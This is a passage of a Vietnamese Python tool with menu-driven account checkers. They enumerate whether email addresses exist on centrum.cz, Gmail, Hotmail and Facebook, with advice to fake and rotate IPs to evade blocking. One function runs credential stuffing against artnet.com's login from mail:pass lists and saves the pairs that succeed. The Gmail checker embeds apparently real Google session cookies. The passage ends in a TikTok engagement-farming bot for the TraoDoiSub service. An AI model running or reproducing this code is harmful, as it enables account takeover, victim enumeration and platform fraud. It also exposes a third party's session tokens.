                'op': 'checkuser',
                'username': user,
                'domain': 'centrum.cz',
                'ticker': '1',
                }
                headers={
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Origin': 'https://reg.centrum.cz',
                'Referer': 'https://reg.centrum.cz/?utm_source=centrumHP&utm_medium=mailbox&utm_term=registrovat',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                }
                url='https://reg.centrum.cz/ajax.php'
                res=requests.post(url,data=data, headers=headers).json()
                check=res["status"]
                full=user+"@centrum.cz"
                if check == 0:
                        print("\033[1;31mLIVE =>",full)
                else:
                        print("\033[1;32mDIE =>",full)
                        open(luu_email,"a").write(full+"\n")
        with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(run, listctr)


def gmail():


        try:
                print(f"{tim}Hỗ Trợ Định Dạng Mail:Pass\n")
                nhap_file=input(f"\033[1;33mNhập File Chứa Email:{vang} ")
                luu_email=input(f"\033[1;94mNhập File Lưu Email Die:{vang} ")
        except:
                print("\033[1;31mKhông Tìm Thấy File!")
                quit()
        mo_file=open(nhap_file,"r").read().splitlines()
        list_gmail=[]
        for i in mo_file:
                mail=i.strip("\n")
                email=i.split(':')[0]
                list_gmail.append(email)
        def run(email):
                data=f'flowEntry=SignUp&flowName=GlifWebSignIn&continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&f.req=%5B%22AEThLlxW8eNh7I717NFQgEJhhfS0ySiuzQJxzYc_22vnt8YllYT8g4EGkHpf0ZJJcp5mjKoldzI8VzX0YNVGVulzcGeFeE2YYYMB_mflSMSYLBtYiWGUjBI1_eprTOfxvzkTDmdpPPRrqAmlnOwR9QdBX2NGxninYT4OUJcGgTDvvLqtN6fo8SCMm90cQvkWVQN5kNVb_wCzHyrHOjIhSQVUB73B8RI9hw%22%2C%22%22%2C%22%22%2C%22{email.replace("@gmail.com","")}%22%2Ctrue%2C%22S1140864020%3A1670945489551602%22%2C1%5D&at=AFoagUW6UNV8lKuxebNs0SsIepiy670yiw%3A1670945489567&azt=AFoagUVtLLqRGj7U4bGqhDm30sJVEd1I5w%3A1670945489567&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22VN%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B5%2C%2277185425430.apps.googleusercontent.com%22%2C%5B%22https%3A%2F%2Fwww.google.com%2Faccounts%2FOAuthLogin%22%5D%2Cnull%2Cnull%2C%2291132a1d-0fb7-47b1-88c6-efe6f2983fda%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C5%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2Cfalse%2C1%2C%22%22%5D&gmscoreversion=undefined&'
                headers={
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'cookie': 'SOCS=CAISHAgCEhJnd3NfMjAyMjA5MjYtMF9SQzIaAnZpIAEaBgiA49iZBg; SEARCH_SAMESITE=CgQIiJcB; OTZ=6808754_28_28__28_; SID=Rgjt_cNy7lrlpaysYS_SblWtFHK8poW1mo6VJYa0OSV4R0xP1dOtBDROhKjz5SFZ2HPEAg.; __Secure-1PSID=Rgjt_cNy7lrlpaysYS_SblWtFHK8poW1mo6VJYa0OSV4R0xP6i9SRLJ2CfBQdtzAtQwGKw.; __Secure-3PSID=Rgjt_cNy7lrlpaysYS_SblWtFHK8poW1mo6VJYa0OSV4R0xPLecZ92MaIfSrGuMqMt58pA.; LSID=o.chat.google.com|o.mail.google.com|s.VN|s.youtube:Rgjt_QKOq4VvjZ-zeMOEMrnS2bJuYXMykeZ03pk5VTiBmCrS_GBxgp-6OrljgSEuhCTmpw.; __Host-1PLSID=o.chat.google.com|o.mail.google.com|s.VN|s.youtube:Rgjt_QKOq4VvjZ-zeMOEMrnS2bJuYXMykeZ03pk5VTiBmCrSh_tFjkFrpPLp8IwjEa20Fg.; __Host-3PLSID=o.chat.google.com|o.mail.google.com|s.VN|s.youtube:Rgjt_QKOq4VvjZ-zeMOEMrnS2bJuYXMykeZ03pk5VTiBmCrSwGQJGzGnctiYneQHj99LgQ.; HSID=AIUuPaTXOPxOkhMLf; SSID=Athev6z3ak8lEpjuF; APISID=8DlG_TO9ysaCYWTf/Ae-1aPHfAEn7sgv55; SAPISID=GedaQ3G9H4uxE2bs/A3OQFQ_hkv_E85cJ4; __Secure-1PAPISID=GedaQ3G9H4uxE2bs/A3OQFQ_hkv_E85cJ4; __Secure-3PAPISID=GedaQ3G9H4uxE2bs/A3OQFQ_hkv_E85cJ4; ACCOUNT_CHOOSER=AFx_qI5txOCPu91XTnxPNWCseBPchHwgbehh8VuGmeFk2zRINY0V738h-KLeP5Yo3lfvSiV5l-VtwLRgN5Op0w_XVG6YwqIPMLN-BEa6XvrEhrKkXR8gCYkKgdnPUidsjcpCI1GdsBAPbKTlcobj0M0qfH_I3VOANYPGKYf9_AEOU1nH7JXGgaLrtLC4auEVbAiLDXrOhUipqvcGttb7vTflj9NtvK68Ml-Sd47VtuV0Cil4fCv-0sA; AEC=AakniGP-meb0VviSuwR7IJjoArTEwhSbhpotg-le9KKmLAAOgktBblZi5w; NID=511=kPtbzrhed3UY0hf0TMdxpUWo0GtPwy36ZNTlZddiOq1gkQDBPCxh7VKs010hIkHQpo479bpBczkzqMG0H8A3MCw_zrQDLsz5slA7JO2Y12uOh0tEK2j7pLWpZQdtOSTmRo6rJQTeGz2OSKI3RCaBU-6hbKcj81RZ8Xq-ClVxC17Bza4kPouFYs0LsHEVHYIajoqlz4HtzfYHkqE6g_lbfFb16dB9SKlFE6CX7r1FymiUUwCXWLMPgBS-cBXiSBNwAc-T1qXI_iCfIToCMr-y-zxIi-w95fgeDB75V-MKPUHizSyKd2_yLMuYmA; 1P_JAR=2022-12-13-10; __Host-GAPS=1:RVsbsQmEhDoLUWva9ubWUjp1xqfen5umeSWt_tt3GEE_egqADJrD_E1hzlaB8ntwZbhkS4j5ZmamHWgB9u04UNJLaYQrXGExdkm6LHNWFo_WdZYEreZQ033j2EQggNdO6OLUV6X_rW5G0dpBsHryFVH_XhOTnQ:cbjgPCdoVlKJTgeQ; SIDCC=AIKkIs2HVbit189PhWNwtaOVx1w7KkuPvA9zMl9pwOAA9qBwPFutPfoy6NDWQj-BSmFhRXIGbg; __Secure-1PSIDCC=AIKkIs0b8W5dBEgFOgDFbtzs8eMcRhIppWPIfWr6OotDZ-9FNMngm-BupwRxFRzrjM4DOj4Et-0; __Secure-3PSIDCC=AIKkIs3y6FQcDoVUOoLByb8UDCXpUUC6LI0tiGBtnQpSskEzWcnMNNMf_O63FzSBDCAK-7qjc68',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp',
                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=91132a1d-0fb7-47b1-88c6-efe6f2983fda,sync_account_id=111888066456390590950,signin_mode=all_accounts,signout_mode=show_confirmation',
                'x-client-data': 'CIu2yQEIpLbJAQjEtskBCKmdygEIq5PLAQiSocsBCIr5zAEI3fnMAQjA+swBCPD/zAEIh4HNAQiygs0BCL2DzQE=',
                'x-same-domain': '1',
                }
                params={
                'hl': 'vi',
                '_reqid': '62102',
                'rt': 'j',
                }
                url='https://accounts.google.com/_/signup/webusernameavailability'
                res=requests.post(url, data=data, headers=headers, params=params).text
                fix=res.replace(")]}'","").split('[[["gf.wuar",')[1].split(',[],')[0].split(']]]')[0].split(',[')[0].split(']]]')[0]
                if fix == "1":
                        print("\033[1;32mDIE =>",email)
                elif fix == "2":
                        print("\033[1;31mLIVE =>",email)
                else:
                        print("\033[1;33mLỖI =>",email)
        with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(run, list_gmail)




def validfb():
  try:
    print (" \033[1;93m LƯU Ý :")
    print ("   \033[1;93m•HỖ TRỢ ĐỊNH DẠNG MAIL|PASS")
    print ("   \033[1;93m•TOOL CHẠY ĐA LUỒNG ĐỒNG NGHĨA VỚI IP CỦA BẠN SẼ DỄ BỊ FB BLOCK HƠN")
    print ("   \033[1;93m•VUI LÒNG FAKE IP TRƯỚC CHẠY TOOL NÀY")
    print ("   \033[1;93m•MỖI IP CHECK ĐƯỢC 50-80 MAIL RỒI ĐỔI IP KHÁC")
    fileEmail = open(input(" \033[1;36mNhập File Chứa Email(ex: mail.txt) : ")).readlines()
    valid = input(" \033[1;34mNhập File Lưu Email Valid Facebook(ex: validfb.txt) : ")
  except:
    print ("\033[1;31mKHÔNG TÌM THẤY FILE BẠN ĐÃ NHẬP !")
    quit()



  list_email_fb = []
  for line_email_fb in fileEmail:
    email_fb1 = line_email_fb.strip("\n")
    email_fb = email_fb1.split(':')[0]

    list_email_fb.append(email_fb)
  link1='https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0'
  h1={
          'Accept': '*/*',
          'Pragma': 'no-cache',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  }

  ses=requests.Session()
  get_data=ses.get(link1,headers=h1)
  cookie=get_data.cookies.get_dict()['datr']
  get_data = get_data.text
  lsd=get_data.split('"lsd" value="')[1].split('"')[0]
  jazoest=get_data.split('"jazoest" value="')[1].split('"')[0]
  def run_check_valid(emailfb):
    data = f'lsd={lsd}&jazoest={jazoest}&email={emailfb}&did_submit=Rechercher'

    link2='https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0'

    h2={
              'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
              'Referer': 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=2&ars=facebook_login&alternate_search=0&toggle_search_mode=1',
              'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
              'Content-Type': 'application/x-www-form-urlencoded',
              'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
              'Host': 'm.facebook.com',
              'Connection': 'Keep-Alive',
              'Cache-Control': 'no-cache',
              'Cookie':f'datr={cookie}',
              'Content-Length': '84',
  }

    check = requests.post(link2,headers=h2,data=data).text
    #cc = check.split('Votre recherche ne donne aucun résultat')
    kq_check = re.search("Votre recherche ne donne aucun résultat", check)
    n1=0
    n1+=1
    n2=0
    n2 +=1
    if kq_check == None:
      print ("\033[1;32mCó Liên Kết => " +emailfb)
      time.sleep(1)
      open(valid,"a").write(emailfb+"\n")
    else:
      print ("\033[1;31mKhông Liên Kết => " + emailfb)
      time.sleep(1)
  with concurrent.futures.ThreadPoolExecutor() as executor:
    executor.map(run_check_valid, list_email_fb)

def run_check():

 x = open(input(f"{xanhnhat}Nhập File Chứa Email:{vang} ")).readlines()
 save = input(f"{xanhnhat}Nhập File Lưu Email:{vang} ")
 print("\033[1;39mVui Lòng Đợi Tool Check Mã")
 print (" [••]💻Loading💻[••] ")
 time.sleep(2)
 clear()
 list = []
 for e in x:
  email = e.strip("\n")
  list.append(email)
 def run(email):
  headers1 = {'Host':'d.facebook.com','user-agent':'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'mark.via.gp','dnt':'1','sec-fetch-site':'none','sec-fetch-mode':'navigate','sec-fetch-user':'?1','sec-fetch-dest':'document','accept-language':'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7'}
  get_ck = requests.get(url="https://d.facebook.com/",headers=headers1)
  cookie = get_ck.headers['set-cookie'].split('; sb=')[0]+';'+get_ck.headers['set-cookie'].split('sb=')[1].split(';')[0]+';'
  headers2 = {'Host':'d.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','origin':'https://d.facebook.com','content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'mark.via.gp','sec-fetch-site':'same-origin','sec-fetch-user':'?1','sec-fetch-dest':'document','referer':'https://d.facebook.com/reg/?cid=103&refsrc=deprecated&_rdr','accept-language':'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7','cookie':cookie}
  get_data = requests.get(url="https://d.facebook.com/reg/?cid=103&refsrc=deprecated&_rdr",headers=headers2).text
  lsd = get_data.split('name="lsd" value="')[1].split('"')[0]
  jazoest = get_data.split('name="jazoest" value="')[1].split('"')[0]
  reg_impression_id = get_data.split('name="reg_impression_id" value="')[1].split('"')[0]
  reg_instance = get_data.split('name="reg_instance" value="')[1].split('"')[0]
  headers3 = {'Host':'d.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','origin':'https://d.facebook.com','content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'mark.via.gp','sec-fetch-site':'same-origin','sec-fetch-user':'?1','sec-fetch-dest':'document','referer':'https://d.facebook.com/reg/?cid=103&refsrc=deprecated&_rdr','accept-language':'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7','cookie':cookie}
  data = {'lsd':lsd,'jazoest':jazoest,'cpp':'2','reg_instance':reg_instance,'submission_request':'true','helper':'','reg_impression_id':reg_impression_id,'ns':'0','zero_header_af_client':'','app_id':'','logger_id':'','field_names[]':'firstname','field_names[]':'reg_email__','field_names[]':'sex','field_names[]':'birthday_wrapper','field_names[]':'reg_passwd__','lastname':'Nguyễn','firstname':'AnKhang','reg_email__':email,'sex':'2','custom_gender':'','did_use_age':'false','birthday_day':'1','birthday_month':'1','birthday_year':'1998','age_step_input':'','reg_passwd__':'','submit':'Đăng+ký'}
  check = requests.post("https://d.facebook.com/reg/submit/?cid=103", headers = headers3, data=data).text
  if 'Nhập mật khẩu có tối thiểu 6 ký tự bao gồm số' in check:
   print ('\033[1;33m|True\033[1;33m| \033[1;32m' + email + " | Bao Mã")
   open(save,"a").write(email + "\n")
  else:
   print ('\033[1;33m|False\033[1;33m| \033[1;31m' + email + " | Không Bao Mã")

 with concurrent.futures.ThreadPoolExecutor() as executor:
  executor.map(run, list)

def checkhotmail():
  print (Fore.WHITE + Style.BRIGHT + " •CÓ THỂ NHẬP ĐỊNH DẠNG MAIL|PASS")
  s = session()
  n_hotmail = 0
  hotmail = open(input(Fore.WHITE + Style.BRIGHT + " -Nhập File Hotmail(ex: hotmail.txt) : ")).readlines()
  hotmail_die = input(Fore.WHITE + Style.BRIGHT + " -Nhập File Lưu Hotmail Die(hotmaildie.txt) : ")
  for line_hotmail in hotmail:
    n_hotmail += 1
    HotMail = line_hotmail.strip("\n")
    name_hotmail = HotMail[0:HotMail.index("@")]
    DL = s.get("https://signup.live.com/signup?username="+name_hotmail+"@hotmail.com&lic=1")
    kq = re.search("isAvailable",DL.text)
    if kq == None:
      print (Fore.RED + Style.BRIGHT + " [" + str(n_hotmail) + "] Email Live : " + name_hotmail + "@hotmail.com")
    else:
      print (Fore.GREEN + Style.BRIGHT + " [" + str(n_hotmail) + "] Email Die : " + name_hotmail + "@hotmail.com")
      open(hotmail_die,"a").write(name_hotmail + "@hotmail.com" + "\n")

def bahao():
        try:
                print(f"{tim}ĐỊNH DẠNG MAIL:PASS")
                Q = input("\033[1;36mNhập File Chứa Mail: \033[1;37m")
                O = input("\033[1;32mNhập File Lưu Mail: \033[1;37m")
        except:
                print(f"{do}Không Tìm Thấy File!")
                quit()
        W=open(Q,'r').readlines()
        for mail in W:
                email=mail.strip("\n")
                R=email.split(':')[0]
                T=email.split(':')[1]
                data={
                'Username': R,
                'Password': T,
                '__RequestVerificationToken': 'CfDJ8PDk0bo74tpDgFw4w1cHj4uDjFpeEUBb53yLEN8H9DifBv3kqlVvcIPAX1Y0vfnAQt9nE53KtNMuyr4jCBUogWRKqyEwApGToLVQPiwvCafEl1Ibp-oQsuXeHBT78-B2aCnORqz2r_MS-61FznXPqN0',
                }
                headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://login.artnet.com',
                'Referer': 'https://login.artnet.com/?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Ddotcom%26response_type%3Dcode%2520id_token%26scope%3Dopenid%2520email%2520userid%26redirect_uri%3Dhttps%253A%252F%252Fwww.artnet.com%252Fmy-account%252Flogin%26state%3D7b389ffd9a2177d3cbc6f6a09e94434b347424e0639ddd5119344aea0b024fdb%26nonce%3D8d2887f7863390482b901593fa79435e87c88ff93e6fd34fdb42f65cf3f9f129%26response_mode%3Dform_post%26BackoutUrl%3Dhttps%253A%252F%252Fwww.artnet.com%252F%26hideRegistration%3DTrue',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                }
                cookies={
                'visid_incap_2666598': 'nphH9c3PRUm4b6oZWP2/MtKWZGQAAAAAQUIPAAAAAAAhvaSfs/yzi5iqZeIAKXVR',
                'incap_ses_1561_2666598': 'Zdo9HqQ5aG7b0UnnkMmpFdOWZGQAAAAAz9s7d+aUJEcdoLkJYliNQQ==',
                '_gid': 'GA1.2.1451285490.1684313814',
                '_gcl_au': '1.1.383902085.1684313815',
                '__utma': '3956448.194647232.1684313814.1684313815.1684313815.1',
                '__utmc': '3956448',
                '__utmz': '3956448.1684313815.1.1.utmcsr=yahoo|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
                '__utmv': '3956448.|2=User_ID=638199106139900000=1',
                '__utmt': '1',
                '__utmb': '3956448.1.10.1684313815',
                '_dc_gtm_UA-31229-15': '1',
                '_gat_UA-121129793-3': '1',
                '__gads': 'ID=bd5ce8e94554dff7:T=1684313815:S=ALNI_MYQbj2jUBNqGavsOaX_ML77CcPH5w',
                '__gpi': 'UID=00000c074a0fc498:T=1684313815:RT=1684313815:S=ALNI_MajfrwQMUToOoA3ip5PQMsB8M-Abg',
                '__qca': 'P0-1383996409-1684313816296',
                '_fbp': 'fb.1.1684313817529.207332170',
                '.AspNetCore.Antiforgery.9TtSrW0hzOs': 'CfDJ8PDk0bo74tpDgFw4w1cHj4uaZyh30VsEfgcUqLLBTgfPsq9riEAIHmgt9KUcuSKoswkthpjl6ldsUOWwMHH38ieCO-mfODjJyzQ8VHpq_ozeaNEfze7xofSnD3dls0w3NaSdSPfdBvc1w8lwhgkxGDE',
                '_gat_UA-121129793-1': '1',
                '_ga': 'GA1.1.194647232.1684313814',
                '_ga_KG58FKYK9Y': 'GS1.1.1684313816.1.1.1684313822.0.0.0',
                }
                params={
                'returnurl': '/connect/authorize/callback?client_id=dotcom&response_type=code%20id_token&scope=openid%20email%20userid&redirect_uri=https%3A%2F%2Fwww.artnet.com%2Fmy-account%2Flogin&state=7b389ffd9a2177d3cbc6f6a09e94434b347424e0639ddd5119344aea0b024fdb&nonce=8d2887f7863390482b901593fa79435e87c88ff93e6fd34fdb42f65cf3f9f129&response_mode=form_post&BackoutUrl=https%3A%2F%2Fwww.artnet.com%2F&hideRegistration=True',
                }
                response = requests.post('https://login.artnet.com/', params=params, cookies=cookies, headers=headers, data=data).text
                if 'Incorrect username or password'in response:
                        print(f"\033[1;31m(WRONG) {R}:{T}")
                else:
                        print(f"\033[1;32m(SUCCESS) {R}:{T}")
                        open(O,'a').write(R+':'+T+"\n")



def help():
    clear()
    runbanner(helpmenu)
    luachon()



def luachon():
        chon=input(f"{xanhnhat}Nhập lựa chọn của bạn :{vang} ")
        if chon == '!help':
                clear()
                help()
        if chon == '!o2pl':
                clear()
                runbanner(chontool)
                o2pl()
        if chon == '!passhot':
                clear()
                runbanner(chontool)
                passhot()
        if chon == '!centrum':
                clear()
                runbanner(chontool)
                centrum()
        if chon == '!gmail':
                clear()
                runbanner(chontool)
                gmail()
        if chon == '!validfb':
                clear()
                validfb()
        if chon == '!baoma':
                clear()
                runbanner(chontool)
                run_check()
        if chon == '!livediehot':
                clear()
                runbanner(chontool)
                checkhotmail()
        if chon == '!passartnet':
                clear()
                runbanner(chontool)
                bahao()
#=================================================================================================
class TraoDoiSub_Api (object):
  def __init__ (self, token):
    self.token = token
    self.total = 0
  
  def main(self):
    try:
      main = requests.get('https://traodoisub.com/api/?fields=profile&access_token='+self.token).json()
      try:
        return main['data']
      except:
        False
    except:
      return False
  def run(self, user):
    try:
      run = requests.get(f'https://traodoisub.com/api/?fields=tiktok_run&id={user}&access_token={self.token}').json()
      try:
        return run['data']
      except:
        return False
    except:
      return False
  def get_job(self, type):
    try:
      get = requests.get(f'https://traodoisub.com/api/?fields={type}&access_token={self.token}')
      return get
    except:
      return False
  
  def cache(self, id, type):
    try:
      cache = requests.get(f'https://traodoisub.com/api/coin/?type={type}&id={id}&access_token={self.token}').json()
      try:
        cache['cache']
        return True
      except:
        return False
    except:
      return False

  def nhan_xu(self, id, type):
      try:
        nhan = requests.get(f'https://traodoisub.com/api/coin/?type={type}&id={id}&access_token={self.token}')
        xu = nhan.json()['data']['xu']
        msg = nhan.json()['data']['msg']
        job = nhan.json()['data']['job_success']
        xuthem = nhan.json()['data']['xu_them']
        global total
        total=xuthem
        thanhngang(16)
        print(f'\n{xanh_la}Nhận Thành Công {job} Nhiệm Vụ {trang}| {xanh_la}{msg} {trang}| {xanh_la}TOTAL {vang}{total} {xanh_la}Xu {trang}| {vang}{xu} ')
        thanhngang(16)
        if job == 0:
          return 0
      except requests.exceptions.RequestException as e:
            if "error" in nhan.text and "msg" in nhan_data:
                hien = nhan_data.get('msg', '')
                print(do + hien, end='\r')
                sleep(2)
                print(' ' * len(hien), end='\r')
            else:
                print(f'\n{do}Nhận Xu Thất Bại !', end='\r')
                sleep(2)
                print(' ' * 55, end='\r')
            return False
from sys import platform
may = 'mb' if platform[0:3] == 'lin' else 'pc'
def chuyen(link, may):
  if may == 'mb':
    os.system(f'xdg-open {link}')
  else:
    os.system(f'cmd /c start {link}')
   
def tdstt():
  dem=0
  while True:
    if os.path.exists('configtds.txt'):
      with open('configtds.txt', 'r') as f:
        token = f.read()
      tds = TraoDoiSub_Api(token)
      data = tds.main()
      try:
        print(f'\n{trang}[{do}</>{trang}]{xanh_la}Nhập {trang}[{vang}1{trang}] {xanh_la}Giữ Lại Tài Khoản '+vang+ data['user'] )
        print(f'{trang}[{do}</>{trang}]{xanh_la}Nhập {trang}[{vang}2{trang}] {xanh_la}Nhập Access_Token TDS Mới')
        chon = input(f'{trang}[{do}</>{trang}]{xanhnhat}Nhập {trang}===>: {vang}')
        if chon == '2':
          os.remove('configtds.txt')
        elif chon == '1':
          pass
        else:
          print(do+'Lựa chọn không xác định !!!');thanhngang(16)
          continue 
      except:
        os.remove('configtds.txt')
    if not os.path.exists('configtds.txt'):
      token = input(f'\n{trang}[{do}</>{trang}]{xanhnhat}Nhập Access_Token TDS: {vang}')
      with open('configtds.txt', 'w') as f:
        f.write(token)
    with open('configtds.txt', 'r') as f:
      token = f.read()
    tds = TraoDoiSub_Api(token)
    data = tds.main()
    try:
      xu = data['xu']
      xudie = data['xudie']
      user = data['user']
      print(xanh_la+' Đăng Nhập Thành Công ')
      break
    except:
      print(do+'Access Token Không Hợp Lệ! Xin Thử Lại ')
      os.remove('configtds.txt')
      continue 
  clear()
 
  runbanner(chontool)
  print(f'{trang}[{do}</>{trang}]{xanh_la}Tên Tài Khoản: {vang}{user} ')
  print(f'{trang}[{do}</>{trang}]{xanh_la}Xu Hiện Tại: {vang}{xu}')
  print(f'{trang}[{do}</>{trang}]{do}Xu Bị Phạt: {vang}{xudie} ')
  while True:
    ntool=0
    thanhngang(16)
    print(f'\n{trang}[{do}</>{trang}]{xanh_la}Nhập {trang}[{vang}1{trang}] {xanh_la}Để Chạy Nhiệm Vụ Tim')
    print(f'{trang}[{do}</>{trang}]{xanh_la}Nhập {trang}[{vang}2{trang}] {xanh_la}Để Chạy Nhiệm Vụ Follow')
    print(f'{trang}[{do}</>{trang}]{xanh_la}Nhập {trang}[{vang}3{trang}] {xanh_la}Để Chạy Nhiệm Vụ Follow Tiktok Now')
    nhiem_vu=input(f'{trang}[{do}</>{trang}]{xanhnhat}Nhập Số Để Chạy Nhiệm Vụ: {vang}')
    dl = int(input(f'{trang}[{do}</>{trang}]{xanhnhat}Nhập Delay: {vang}'))
    while True:
      if ntool == 2:
        break
      ntool = 0
      thanhngang
      nv_nhan=int(input(f'{trang}[{do}</>{trang}]{xanhnhat}Sau Bao Nhiêu Nhiệm Vụ Thì Nhận Xu: {vang}'))
      if nv_nhan < 8:
        print(do+'Trên 8 Nhiệm Vụ Mới Được Nhận Tiền!')
        continue
      if nv_nhan > 15:
        print(do+'Nhận Xu Dưới 15 Nhiệm Vụ Để Tránh Lỗi')
        continue
      user_cau_hinh=input(f'{trang}[{do}</>{trang}]{xanhnhat}Nhập User Name Tik Tok Cần Cấu Hình: {vang}')
      cau_hinh=tds.run(user_cau_hinh)
      if cau_hinh != False:
        user=cau_hinh['uniqueID']
        id_acc=cau_hinh['id']
        thanhngang(16)
        print(f'\n{xanh_la}Đang Cấu Hình ID: {vang}{id_acc} {do}| {xanh_la}User: {vang}{user} ')
        thanhngang(16)
      else:
        print(f'{do}Cấu Hinh Thất Bại User: {vang}{user_cau_hinh} ')
        continue 
      while True:
        if ntool==1 or ntool==2:break
        if '1' in nhiem_vu:
          listlike = tds.get_job('tiktok_like')
          if listlike == False:
            print(do+'\nKhông Get Được Nhiệm Vụ Like              ', end = '\r');sleep(2); print('                                                        ', end = '\r')
          elif 'error' in listlike.text:
            if listlike.json()['error'] == 'Thao tác quá nhanh vui lòng chậm lại':
              coun = listlike.json()['countdown']
              print(f'{do}Đang Get Nhiệm Vụ Like, COUNTDOWN: {str(round(coun, 3))} ', end = '\r'); sleep(2); print('                                                       ', end = '\r')
            elif listlike.json()['error'] == 'Vui lòng ấn NHẬN TẤT CẢ rồi sau đó tiếp tục làm nhiệm vụ để tránh lỗi!':
              nhan = tds.nhan_xu('TIKTOK_LIKE_API', 'TIKTOK_LIKE') #TIKTOK_LIKE, TIKTOK_FOLLOW, TIKTOK_COMMENT
            else:
              print(do+listlike.json()['error'] , end ='\r');sleep(2); print('                                                        ', end = '\r')
          else:
            try:
